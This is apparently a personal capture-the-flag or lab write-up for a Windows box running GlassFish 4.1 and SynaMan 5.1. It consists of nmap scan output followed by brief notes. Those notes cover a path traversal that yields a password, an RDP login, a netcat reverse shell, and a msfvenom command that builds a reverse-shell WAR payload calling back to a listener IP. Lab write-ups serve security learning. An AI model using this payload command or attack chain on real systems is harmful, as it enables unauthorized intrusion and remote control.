135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fishyyy
| Issuer: commonName=Fishyyy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-28T20:58:31
| Not valid after:  2022-04-29T20:58:31
| MD5:   994d:77c5:7578:b697:e873:c43f:a05a:129a
|_SHA-1: a205:0a10:e54e:a924:9e1e:5386:f29c:dc1b:7e4c:ae55
|_ssl-date: 2021-10-29T21:05:47+00:00; -4y282d19h41m55s from scanner time.
3700/tcp  open  giop
| fingerprint-strings: 
|   GetRequest, X11Probe: 
|     GIOP
|   giop: 
|     GIOP
|     (IDL:omg.org/SendingContext/CodeBase:1.0
|     169.254.182.139
|     169.254.182.139
|_    default
4848/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
|_http-server-header: GlassFish Server Open Source Edition  4.1 
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Login
|_http-favicon: Unknown favicon MD5: E7730F600A066A9C87CA8545E947FD04
5040/tcp  open  unknown
6060/tcp  open  x11?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"425-1267803922000"
|     Last-Modified: Fri, 05 Mar 2010 15:45:22 GMT
|     Content-Type: text/html
|     Content-Length: 425
|     Date: Fri, 29 Oct 2021 21:02:57 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <html>
|     <head>
|     <META HTTP-EQUIV="REFRESH" CONTENT="1;URL=app">
|     </head>
|     <body>
|     <script type="text/javascript">
|     <!--
|     currentLocation = window.location.pathname;
|     if(currentLocation.charAt(currentLocation.length - 1) == "/"){
|     window.location = window.location + "app";
|     }else{
|     window.location = window.location + "/app";
|     //-->
|     </script>
|     Loading Administration console. Please wait...
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 403 
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Set-Cookie: JSESSIONID=734BEF24CC481E06CEA4328AE0E1E483; Path=/
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 5028
|     Date: Fri, 29 Oct 2021 21:02:58 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
|     <title>
|     SynaMan - Synametrics File Manager - Version: 5.1 - build 1595 
|     </title>
|     <meta NAME="Description" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta NAME="Keywords" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta http-equiv="X-UA-Compatible" content="IE=10" />
|     <link rel="icon" type="image/png" href="images/favicon.png">
|     <link type="text/css" rel="stylesheet" href="images/AjaxFileExplorer.css">
|     <link rel="stylesheet" type="text/css"
|   JavaRMI: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 145
|     Date: Fri, 29 Oct 2021 21:02:52 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|_    <html><head><title>Oops</title><body><h1>Oops</h1><p>Well, that didn't go as we had expected.</p><p>This error has been logged.</p></body></html>
7676/tcp  open  java-message-service Java Message Service 301
7680/tcp  open  pando-pub?
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
|_http-server-header: GlassFish Server Open Source Edition  4.1 
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|_  Potentially risky methods: PUT DELETE TRACE
|_http-title: Data Web
8181/tcp  open  ssl/http             Sun GlassFish Open Source Edition  4.1
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Issuer: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2014-08-21T13:30:10
| Not valid after:  2024-08-18T13:30:10
| MD5:   594f:8111:2179:0c71:532a:00ab:223e:0e8a
|_SHA-1: 1ff8:eff1:b17d:c744:191e:213a:3102:9aa7:5982:a63c
|_http-title: Data Web
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
8686/tcp  open  java-rmi             Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @169.254.182.139:8686
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
49664/tcp open  msrpc                Microsoft Windows RPC
49665/tcp open  msrpc                Microsoft Windows RPC
49666/tcp open  msrpc                Microsoft Windows RPC
49667/tcp open  msrpc                Microsoft Windows RPC
49668/tcp open  msrpc                Microsoft Windows RPC
49669/tcp open  msrpc                Microsoft Windows RPC
49670/tcp open  msrpc                Microsoft Windows RPC

.port 8080 data web
<img width="1598" height="611" alt="image" src="https://github.com/user-attachments/assets/396cd157-ad91-4d16-8fa0-aa12353d3cc4" />

port 4848 glassfish
<img width="1440" height="651" alt="image" src="https://github.com/user-attachments/assets/aeca33ed-89df-4534-ad6f-0b99c102c9a1" />

path traversal?
https://www.exploit-db.com/exploits/39441
<img width="1704" height="317" alt="image" src="https://github.com/user-attachments/assets/e3758040-ded9-45e1-9437-811d760160c9" />

port 6060 synaman 5.1
<img width="1227" height="673" alt="image" src="https://github.com/user-attachments/assets/a0cfe148-684b-46f5-a3b0-5d5bbab7bf17" />

use path traversal to find synaman password. arthur:KingOfAtlantis
<img width="1682" height="854" alt="image" src="https://github.com/user-attachments/assets/d2d1c70c-65ca-49e5-a204-6034e9d42521" />

rdp into arthur
<img width="842" height="609" alt="image" src="https://github.com/user-attachments/assets/f0dafbf9-528c-4edf-8e30-6db657dd5d9b" />
ran a nc rev shell
<img width="1163" height="390" alt="image" src="https://github.com/user-attachments/assets/fc2716af-e9d6-46bd-8ce1-471896132c6b" />

use glass fish
<img width="576" height="186" alt="image" src="https://github.com/user-attachments/assets/d29aa2ed-7ca4-4206-a660-a7921357b944" />
they say use .war file
upload aplication
msfvenom -p java/shell_reverse_tcp LHOST=192.168.45.162 LPORT=1337 -f war -o shell.war
remember port 8080 was under glassfish
so we just 
http://192.168.120.168:8080/shell/
and then have a listener
<img width="1296" height="236" alt="image" src="https://github.com/user-attachments/assets/00fe3abd-1f8c-4add-a209-ae1c4c780b64" />
this was tough esp with lag from machine
